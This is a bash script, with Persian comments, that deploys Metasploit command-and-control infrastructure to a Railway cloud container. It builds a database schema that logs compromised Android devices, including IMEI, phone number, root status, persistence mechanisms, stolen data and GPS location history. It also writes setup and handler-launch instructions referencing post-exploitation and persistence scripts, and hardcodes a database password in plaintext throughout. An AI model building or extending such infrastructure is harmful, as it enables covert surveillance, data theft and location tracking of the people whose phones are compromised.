#!/bin/bash

# Deploy Files to Railway Container
# انتقال فایل‌های لازم به Railway

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║          📤 Deploying Files to Railway Container                ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

PROJECT_ID="0e85ae85-ca7e-4d9a-a408-888cc8b9b6f6"
ENVIRONMENT_ID="fb2cd976-9332-4286-adc9-69889109456e"
SERVICE_ID="95d051e6-d8d9-48cf-85fb-a7a41c1ecced"

LOCAL_DIR="/home/offsec/Documents/GitHub/metasploit-framework1"

echo "📋 فایل‌های آماده برای انتقال:"
echo ""

# ═══════════════════════════════════════════════════════════════
# Step 1: Create deployment package
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [1/3] Creating deployment package..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

DEPLOY_DIR="$LOCAL_DIR/railway_deploy"
mkdir -p "$DEPLOY_DIR"

# Copy essential files
cp "$LOCAL_DIR/railway_handler_final.rc" "$DEPLOY_DIR/" 2>/dev/null
cp "$LOCAL_DIR/post_exploit_railway.rc" "$DEPLOY_DIR/" 2>/dev/null
cp "$LOCAL_DIR/install_persistence.rc" "$DEPLOY_DIR/" 2>/dev/null
cp "$LOCAL_DIR/configure_railway_db.sh" "$DEPLOY_DIR/" 2>/dev/null

# Create SQL file in deploy directory
cat > "$DEPLOY_DIR/railway_persistence_tables.sql" << 'SQL_END'
-- Railway Persistence Tables
-- Created: 2025-11-22

DROP TABLE IF EXISTS device_locations CASCADE;
DROP TABLE IF EXISTS collected_data CASCADE;
DROP TABLE IF EXISTS persistence_mechanisms CASCADE;
DROP TABLE IF EXISTS session_checkpoints CASCADE;
DROP TABLE IF EXISTS persistent_sessions CASCADE;

CREATE TABLE persistent_sessions (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) UNIQUE NOT NULL,
    device_id VARCHAR(255),
    device_name VARCHAR(255),
    android_version VARCHAR(50),
    manufacturer VARCHAR(100),
    model VARCHAR(100),
    imei VARCHAR(50),
    phone_number VARCHAR(30),
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    connection_count INTEGER DEFAULT 1,
    lhost VARCHAR(255),
    lport INTEGER,
    payload_type VARCHAR(100),
    is_active BOOLEAN DEFAULT TRUE,
    persistence_level VARCHAR(50),
    root_access BOOLEAN DEFAULT FALSE,
    installed_apps TEXT,
    notes TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE session_checkpoints (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    checkpoint_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    working_directory TEXT,
    process_id INTEGER,
    process_name VARCHAR(255),
    arch VARCHAR(50),
    privileges TEXT,
    network_info JSONB,
    checkpoint_data JSONB
);

CREATE TABLE persistence_mechanisms (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    mechanism_type VARCHAR(100) NOT NULL,
    mechanism_name VARCHAR(255),
    installation_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE,
    last_verified TIMESTAMP,
    installation_path TEXT,
    configuration JSONB,
    notes TEXT
);

CREATE TABLE collected_data (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    data_type VARCHAR(100) NOT NULL,
    collection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    data_size BIGINT,
    file_path TEXT,
    data_content TEXT,
    metadata JSONB,
    is_encrypted BOOLEAN DEFAULT FALSE
);

CREATE TABLE device_locations (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL REFERENCES persistent_sessions(session_uuid) ON DELETE CASCADE,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    latitude DECIMAL(10, 8),
    longitude DECIMAL(11, 8),
    accuracy DECIMAL(10, 2),
    altitude DECIMAL(10, 2),
    provider VARCHAR(50),
    address TEXT
);

CREATE INDEX idx_session_uuid ON persistent_sessions(session_uuid);
CREATE INDEX idx_device_id ON persistent_sessions(device_id);
CREATE INDEX idx_last_seen ON persistent_sessions(last_seen);
CREATE INDEX idx_is_active ON persistent_sessions(is_active);
CREATE INDEX idx_checkpoints_uuid ON session_checkpoints(session_uuid);
CREATE INDEX idx_persistence_uuid ON persistence_mechanisms(session_uuid);
CREATE INDEX idx_collected_uuid ON collected_data(session_uuid);
CREATE INDEX idx_locations_uuid ON device_locations(session_uuid);

CREATE OR REPLACE VIEW v_active_sessions AS
SELECT 
    ps.*,
    COUNT(DISTINCT pm.id) as persistence_count,
    COUNT(DISTINCT cd.id) as collected_data_count,
    MAX(dl.timestamp) as last_location_time,
    COUNT(DISTINCT dl.id) as location_count
FROM persistent_sessions ps
LEFT JOIN persistence_mechanisms pm ON ps.session_uuid = pm.session_uuid AND pm.is_active = TRUE
LEFT JOIN collected_data cd ON ps.session_uuid = cd.session_uuid
LEFT JOIN device_locations dl ON ps.session_uuid = dl.session_uuid
WHERE ps.is_active = TRUE
GROUP BY ps.id;

CREATE OR REPLACE FUNCTION update_session_timestamp()
RETURNS TRIGGER AS $$
BEGIN
    NEW.last_seen = CURRENT_TIMESTAMP;
    NEW.updated_at = CURRENT_TIMESTAMP;
    IF TG_OP = 'UPDATE' THEN
        NEW.connection_count = NEW.connection_count + 1;
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trigger_update_session
    BEFORE UPDATE ON persistent_sessions
    FOR EACH ROW
    EXECUTE FUNCTION update_session_timestamp();

COMMENT ON TABLE persistent_sessions IS 'Tracks persistent sessions';
COMMENT ON TABLE session_checkpoints IS 'Session state checkpoints';
COMMENT ON TABLE persistence_mechanisms IS 'Persistence mechanisms';
COMMENT ON TABLE collected_data IS 'Data collected from devices';
COMMENT ON TABLE device_locations IS 'GPS location history';
SQL_END

echo "✅ Deployment package created in: $DEPLOY_DIR"
echo ""

# ═══════════════════════════════════════════════════════════════
# Step 2: Create deployment script for Railway
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [2/3] Creating Railway deployment script..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

cat > "$DEPLOY_DIR/setup_railway.sh" << 'SETUP_SCRIPT'
#!/bin/bash

# Setup script to run inside Railway container
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║              🚀 Railway Container Setup                          ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# Create necessary directories
mkdir -p /root/.msf4/ssl
mkdir -p /root/.msf4/modules/post/android/manage

# Generate SSL certificate if not exists
if [ ! -f /root/.msf4/ssl/cert.pem ]; then
    echo "🔐 Generating SSL certificate..."
    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
        -subj "/C=US/ST=State/L=City/O=System/CN=metro.proxy.rlwy.net" \
        -keyout /root/.msf4/ssl/key.pem \
        -out /root/.msf4/ssl/cert.pem 2>/dev/null
    
    cat /root/.msf4/ssl/key.pem /root/.msf4/ssl/cert.pem > /root/.msf4/ssl/combined.pem
    echo "✅ SSL certificate generated"
fi

# Configure database
cat > /root/.msf4/database.yml << YAML_DB
production:
  adapter: postgresql
  database: railway
  username: postgres
  password: oNnmkkGTsBScDMhJGyuPWbHqfBegneKo
  host: postgres.railway.internal
  port: 5432
  pool: 200
  timeout: 5
  encoding: utf8
  sslmode: prefer
  reconnect: true
YAML_DB

echo "✅ Database configuration created"

# Initialize database tables
echo "🗄️  Initializing database tables..."
PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \
psql -h postgres.railway.internal -U postgres -d railway \
-f /root/railway_persistence_tables.sql 2>&1 | grep -E "(NOTICE|CREATE|ERROR)"

if [ $? -eq 0 ]; then
    echo "✅ Database tables created"
else
    echo "⚠️  Database initialization had errors (may already exist)"
fi

# Copy handler configs to root
cp /root/railway_handler_final.rc /root/ 2>/dev/null
cp /root/post_exploit_railway.rc /root/ 2>/dev/null
cp /root/install_persistence.rc /root/ 2>/dev/null

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                    ✅ Setup Complete!                            ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "🚀 To start handler:"
echo "   msfconsole -r /root/railway_handler_final.rc"
echo ""
SETUP_SCRIPT

chmod +x "$DEPLOY_DIR/setup_railway.sh"

echo "✅ Railway setup script created"
echo ""

# ═══════════════════════════════════════════════════════════════
# Step 3: Provide deployment instructions
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [3/3] Deployment instructions..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

cat > "$DEPLOY_DIR/DEPLOYMENT_INSTRUCTIONS.txt" << 'INSTRUCTIONS'
╔══════════════════════════════════════════════════════════════════╗
║           📤 Railway Deployment Instructions                     ║
╚══════════════════════════════════════════════════════════════════╝

⚠️  فایل‌ها در Railway وجود ندارند و باید دستی منتقل شوند.

═══════════════════════════════════════════════════════════════════
روش 1: استفاده از Railway CLI (توصیه می‌شود)
═══════════════════════════════════════════════════════════════════

1️⃣  در ترمینال محلی (Parrot OS):

cd /home/offsec/Documents/GitHub/metasploit-framework1/railway_deploy

# اتصال به Railway
sudo railway ssh \
  --project=0e85ae85-ca7e-4d9a-a408-888cc8b9b6f6 \
  --environment=fb2cd976-9332-4286-adc9-69889109456e \
  --service=95d051e6-d8d9-48cf-85fb-a7a41c1ecced

2️⃣  در Railway container، فایل‌ها را دستی ایجاد کنید:

# ایجاد دایرکتوری
mkdir -p /root

# کپی محتوای فایل‌ها (از ترمینال دیگر)
# برای هر فایل:
cat > /root/railway_persistence_tables.sql << 'EOF'
[محتوای فایل را paste کنید]
EOF

cat > /root/railway_handler_final.rc << 'EOF'
[محتوای فایل را paste کنید]
EOF

cat > /root/post_exploit_railway.rc << 'EOF'
[محتوای فایل را paste کنید]
EOF

cat > /root/setup_railway.sh << 'EOF'
[محتوای فایل را paste کنید]
EOF

chmod +x /root/setup_railway.sh

3️⃣  اجرای setup:

bash /root/setup_railway.sh

═══════════════════════════════════════════════════════════════════
روش 2: استفاده از Git Repository
═══════════════════════════════════════════════════════════════════

1️⃣  فایل‌ها را در Git push کنید:

cd /home/offsec/Documents/GitHub/metasploit-framework1
git add railway_deploy/*
git commit -m "Add Railway deployment files"
git push origin master

2️⃣  در Railway container:

apt-get update && apt-get install -y git
cd /root
git clone https://github.com/ashkan346a/metasploit-framework1.git
cd metasploit-framework1/railway_deploy
bash setup_railway.sh

═══════════════════════════════════════════════════════════════════
روش 3: استفاده از base64 encoding (سریع)
═══════════════════════════════════════════════════════════════════

1️⃣  در Parrot OS، encode کنید:

cd /home/offsec/Documents/GitHub/metasploit-framework1/railway_deploy

echo "=== railway_persistence_tables.sql ==="
base64 -w 0 railway_persistence_tables.sql
echo ""
echo ""

echo "=== railway_handler_final.rc ==="
base64 -w 0 railway_handler_final.rc
echo ""
echo ""

echo "=== setup_railway.sh ==="
base64 -w 0 setup_railway.sh
echo ""

2️⃣  در Railway container، decode کنید:

echo "[BASE64_STRING]" | base64 -d > /root/railway_persistence_tables.sql
echo "[BASE64_STRING]" | base64 -d > /root/railway_handler_final.rc
echo "[BASE64_STRING]" | base64 -d > /root/setup_railway.sh

chmod +x /root/setup_railway.sh
bash /root/setup_railway.sh

═══════════════════════════════════════════════════════════════════
فایل‌های مورد نیاز:
═══════════════════════════════════════════════════════════════════

✅ railway_persistence_tables.sql   - Database schema
✅ railway_handler_final.rc          - Metasploit handler
✅ post_exploit_railway.rc           - Post-exploitation
✅ install_persistence.rc            - Persistence installer
✅ setup_railway.sh                  - Setup script

═══════════════════════════════════════════════════════════════════
بعد از Setup:
═══════════════════════════════════════════════════════════════════

# شروع handler
msfconsole -r /root/railway_handler_final.rc

# بررسی دیتابیس
PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo \
psql -h postgres.railway.internal -U postgres -d railway \
-c "SELECT COUNT(*) FROM persistent_sessions;"

═══════════════════════════════════════════════════════════════════
INSTRUCTIONS

echo "✅ Deployment instructions created"
echo ""

# Display summary
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                ✅ Deployment Package Ready!                      ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📁 Location: $DEPLOY_DIR"
echo ""
echo "📦 Files:"
ls -lh "$DEPLOY_DIR" | tail -n +2 | awk '{print "   " $9 " (" $5 ")"}'
echo ""
echo "📖 Instructions: $DEPLOY_DIR/DEPLOYMENT_INSTRUCTIONS.txt"
echo ""
echo "🚀 Next steps:"
echo "   1. cat $DEPLOY_DIR/DEPLOYMENT_INSTRUCTIONS.txt"
echo "   2. Follow the deployment method"
echo "   3. Run setup_railway.sh in Railway container"
echo ""
